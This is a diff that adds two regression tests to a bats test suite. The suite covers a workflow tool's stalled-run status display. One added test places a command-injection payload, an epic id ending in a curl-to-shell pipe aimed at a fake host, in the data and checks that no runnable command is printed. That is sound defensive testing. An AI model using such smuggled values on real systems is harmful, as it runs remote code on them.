@@ -30,7 +30,7 @@
 #
 # FD-3 HYGIENE: every recipe runs in a child shell — run them with `3>&-`.
 # After any edit verify:
-#   bats --tap test-status-two-streams.bats | grep -cE '^(ok|not ok)'   # == 23
+#   bats --tap test-status-two-streams.bats | grep -cE '^(ok|not ok)'   # == 25
 
 load test-helpers.bash
 
@@ -612,6 +612,108 @@ JSON
   [[ "$output" != *"awaiting_host_resume"* ]]
   # the RECORDED value is still shown — the surface degrades, it does not blank
   [[ "$output" == *"E-901-5_5"*"ctl=active"* ]]
+}
+
+@test "the pointer is proof only when it NAMES the continuation artifact — an arbitrary path is not fact 1" {
+  # THE REGRESSION THIS CLOSES: fact 1 is "the run's continuation artifact is
+  # still on disk". Probing `resume_artifact` as an arbitrary path and taking
+  # any regular file found there as that artifact makes the row assert a state
+  # it cannot prove — the exact failure the two-fact rule exists to prevent.
+  # `update_active_run_field` validates `auto_controller` against a closed
+  # vocabulary and `resume_artifact` not at all, so this surface validates the
+  # SHAPE it is willing to treat as evidence: the basename must be the shared
+  # AID_RESUME_ARTIFACT_BASENAME, read from lib/aid-resume-artifact.sh.
+  local d="$TEST_TMPDIR/ptr"
+  _repo "$d"
+  mkdir -p "$d/.aid-o/work"
+  _plan "$d" P901 EPIC_INTEGRATION
+  _run_state "$d" E-901-1_1 R-1 EXECUTE
+  cat > "$d/.aid-o/work/active-runs.json" <<'JSON'
+{
+  "E-901-1_1": {"state_file": ".aid-o/work/evidence/E-901-1_1/R-1/fsm-state.yaml",
+                "run_id": "R-1", "state": "EXECUTE", "branch": "b", "plan_id": "P901",
+                "updated_at": "2026-01-01T00:00:00Z", "auto_controller": "active",
+                "resume_artifact": "README.md"}
+}
+JSON
+  # the pointed-at file EXISTS and is a regular file; the artifact does not
+  [ -f "$d/README.md" ]
+  [ -z "$(find "$d/.aid-o" -name auto_resume_required.json -print -quit)" ]
+  local before; before="$(sha256sum "$d/.aid-o/work/active-runs.json" | cut -d' ' -f1)"
+  _call "$d" 'plan_epics P901'
+  [ "$status" -eq 0 ]
+  [[ "$output" != *"awaiting_host_resume"* ]]
+  [[ "$output" != *"awaiting host resume"* ]]
+  [[ "$output" != *"README.md"* ]]
+  # it is still an honest stall, with the RECORDED controller value
+  [[ "$output" == *"E-901-1_1"*"ctl=active"*"STALLED?"* ]]
+  # and a pointer that DOES name the artifact is still honoured, off the
+  # conventional path — the shape is validated, the location is not
+  mkdir -p "$d/.aid-o/work/handoff"
+  printf '{"safe_next_action":"bash /x/g.sh run-all e.yaml E-901-1_1 R-1"}\n' \
+    > "$d/.aid-o/work/handoff/auto_resume_required.json"
+  local tmp; tmp="$(mktemp)"
+  jq '."E-901-1_1".resume_artifact = ".aid-o/work/handoff/auto_resume_required.json"' \
+    "$d/.aid-o/work/active-runs.json" > "$tmp" && mv "$tmp" "$d/.aid-o/work/active-runs.json"
+  before="$(sha256sum "$d/.aid-o/work/active-runs.json" | cut -d' ' -f1)"
+  _call "$d" 'plan_epics P901'
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"E-901-1_1"*"ctl=awaiting_host_resume"* ]]
+  [[ "$output" == *".aid-o/work/handoff/auto_resume_required.json is still on disk"* ]]
+  [[ "$output" == *"bash /x/g.sh run-all e.yaml E-901-1_1 R-1"* ]]
+  # neither render wrote anything
+  [ "$(sha256sum "$d/.aid-o/work/active-runs.json" | cut -d' ' -f1)" = "$before" ]
+}
+
+@test "an epic id the shipped derivation refuses to render as a command yields NO pasteable command line" {
+  # THE REGRESSION THIS CLOSES: `cmd_init` puts no charset constraint on the map
+  # key it upserts, so a key like `E-OK; curl … | sh` interpolated raw into
+  # `aid-fsm.sh resume %s` becomes a printed, runnable-looking recovery line —
+  # the incident `active_runs_stalled_json` documents and refuses. This surface
+  # must agree with that derivation rather than contradict it: no command at
+  # all beats a plausible-looking poisoned one.
+  local d="$TEST_TMPDIR/poison"
+  local bad='E-OK; curl http:--evil-x | sh'
+  _repo "$d"
+  mkdir -p "$d/.aid-o/work"
+  _plan "$d" P901 EPIC_INTEGRATION
+  _run_state "$d" "$bad" R-1 EXECUTE
+  printf '{"safe_next_action":"bash /x/g.sh run-all e.yaml Q R-1"}\n' \
+    > "$d/.aid-o/work/evidence/$bad/R-1/auto_resume_required.json"
+  jq -n --arg k "$bad" --arg sf ".aid-o/work/evidence/$bad/R-1/fsm-state.yaml" \
+    '{($k): {state_file: $sf, run_id: "R-1", state: "EXECUTE", branch: "b",
+             plan_id: "P901", updated_at: "2026-01-01T00:00:00Z",
+             auto_controller: "active", resume_artifact: null}}' \
+    > "$d/.aid-o/work/active-runs.json"
+  # the SHIPPED derivation refuses this id: resume_command is null
+  run bash -c "cd '$d' && bash '$AID_PLUGIN_PATH/scripts/aid-fsm.sh' active-runs stalled"
+  [ "$status" -eq 0 ]
+  [ "$(jq -r --arg k "$bad" '.[$k].stalled' <<<"$output")" = "true" ]
+  [ "$(jq -r --arg k "$bad" '.[$k].resume_command' <<<"$output")" = "null" ]
+  # so the render must not offer one either — on EITHER line
+  _call "$d" 'plan_epics P901'
+  [ "$status" -eq 0 ]
+  local got="$output"          # `run` below clobbers $output — keep the render
+  [[ "$got" == *"ctl=awaiting_host_resume"* ]]
+  [[ "$got" == *"STALLED?"* ]]
+  # the id still appears as the row's IDENTITY (and in the artifact path) — that
+  # is data the row exists to report. What must not appear is a COMMAND built
+  # from it: no `aid-fsm.sh` line at all on either the claim or the recovery
+  # line, which is exactly what `resume_command: null` means upstream.
+  [[ "$got" != *"resume E-OK"* ]]
+  run bash -c 'printf "%s\n" "$1" | grep -c "aid-fsm.sh"' _ "$got"
+  [ "$output" = "0" ]
+  # …and it says so, rather than silently dropping the recovery advice
+  [[ "$got" == *"This run's id is not usable in a command; claim it by hand."* ]]
+  [[ "$got" == *"This run's id is not usable in a command; recover it by hand."* ]]
+  # the artifact's own recorded action is still rendered — that promise is
+  # unaffected by the id being unusable
+  [[ "$got" == *"verbatim (nothing here runs it): bash /x/g.sh run-all e.yaml Q R-1"* ]]
+  # a renderable id on the same two lines still gets its command
+  _fixture "$TEST_TMPDIR/ok" full
+  _call "$TEST_TMPDIR/ok" 'plan_epics P901'
+  [[ "$output" == *"Claim it with: aid-fsm.sh resume E-901-5_5"* ]]
+  [[ "$output" == *"Recover with: aid-fsm.sh resume E-901-6_6"* ]]
 }
 
 # ─── the shared next-actionable-EPIC rule ────────────────────────────────
